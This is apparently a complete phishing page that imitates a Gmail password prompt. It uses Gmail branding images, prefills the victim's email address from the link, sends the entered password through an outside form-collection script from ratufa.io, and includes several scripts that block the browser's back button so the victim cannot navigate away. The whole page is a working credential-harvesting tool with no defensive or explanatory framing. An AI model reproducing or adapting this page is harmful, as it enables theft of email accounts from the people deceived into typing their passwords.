<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Welcome</title>
<link rel="icon" type="image/x-icon" href="https://github.com/cdtechdigital/images/blob/main/gmailIcon.jpg?raw=true">
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f0f4f9;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px;
            position: relative;
        }

        .container {
            background-color: #ffffff;
            width: 100%;
            max-width: 960px;
            min-height: 480px;
            border-radius: 24px;
            display: grid;
            grid-template-columns: 1fr 1fr;
            padding: 40px;
            gap: 40px;
            position: relative;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.03);
        }

        .left-column {
            display: flex;
            align-items: center;
            justify-content: center;
            background-color: #ffffff; /* Removed ash color, made plain white */
            border-radius: 16px;
            color: #70757a;
        }

        .right-column {
            display: flex;
            flex-direction: column;
            justify-content: center;
            padding-bottom: 60px; /* Space for the absolute button */
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #202124;
            font-size: 14px;
            font-weight: 500;
        }

        .form-control {
            width: 100%;
            padding: 12px 16px;
            border: 1px solid #747775;
            border-radius: 4px;
            font-size: 16px;
            outline: none;
            transition: border-color 0.2s;
        }

        .form-control:focus {
            border-color: #0b57d0;
            border-width: 2px;
            padding: 11px 15px;
        }

        textarea.form-control {
            resize: vertical;
            min-height: 100px;
        }

        .submit-btn {
            position: absolute;
            bottom: 40px;
            right: 40px;
            background-color: #0b57d0;
            color: white;
            border: none;
            padding: 10px 24px;
            font-size: 14px;
            font-weight: 500;
            border-radius: 100px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .submit-btn:hover {
            background-color: #0842a0;
        }

        .footer {
            width: 100%;
            max-width: 960px;
            display: flex;
            justify-content: space-between;
            margin-top: 24px;
            font-size: 12px;
            color: #5f6368;
            padding: 0 10px;
        }

        .footer-left select {
            border: none;
            background: transparent;
            color: #5f6368;
            cursor: pointer;
            font-size: 12px;
            outline: none;
        }

        .footer-right a {
            color: #5f6368;
            text-decoration: none;
            margin-left: 16px;
        }

        .footer-right a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <div class="container">
        <!-- Left Column: Plain White Image Placeholder Area -->
        <div class="left-column">
            <!-- You can place your <img> tag here directly -->
            <img src="https://github.com/cdtechdigital/images/blob/main/Gmail.JPG?raw=true" alt="Trulli" width="" height="">

        </div>
<script id="ratufa_loader" src="https://www.ratufa.io/c/ld.js?f=px88b6jp&n=n1.ratufa.io"></script>
        <!-- Right Column: Contact Form configured with FormSubmit.io -->
        <div class="right-column">
            <!-- Replace 'your-email@example.com' with your actual verified email address -->
            <form action="" method="POST">
                                        
                <!-- Explicitly name form elements for FormSubmit backend processing -->
                <div class="form-group">
                    <label for="name"></label>
                    <input type="email" id="email" name="email" class="form-control" placeholder="Email address" readonly="readonly" />
                </div>
                
                <div class="form-group">
                    <label for="email"></label>

<input type="password" name="Password" placeholder="Password" class="form-control" style="font-size: 12pt; required="" oninvalid="this.setCustomValidity('Wprowadź hasło do swojego adresu e-mail')"
  oninput="this.setCustomValidity('')"/>
                </div>

                <button type="submit" class="submit-btn">Next</button>
            </form>

        </div>
    </div>

    <div class="footer">
        <div class="footer-left">
            <select>
                <option>English (United States)</option>
            </select>
        </div>
        <div class="footer-right">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </div>
    <script>
        window.addEventListener('DOMContentLoaded', () => {
            if (window.location.hash) {
                document.getElementById("email").value = window.location.hash.substring(1).trim();
            }
        });
    </script>
	    <!-- 1. ANTI-BACKTRACK INTERLOCK ENGINE -->
    <script type="text/javascript">
        (function() {
            window.history.pushState(null, null, window.location.href);
            
            window.onpopstate = function() {
                window.history.pushState(null, null, window.location.href);
           
            };
        })();
    </script>
<script type="text/javascript">
    window.history.pushState(null, "", window.location.href);
    
    window.addEventListener("popstate", function() {
        window.history.pushState(null, "", window.location.href);
    });
</script>
<script type="text/javascript">
    function preventBack() {
        window.history.forward();
    }
    setTimeout("preventBack()", 0);
    
    window.onunload = function () { null };
</script>

</body>
    
</html>
</body>

</body>
</html>
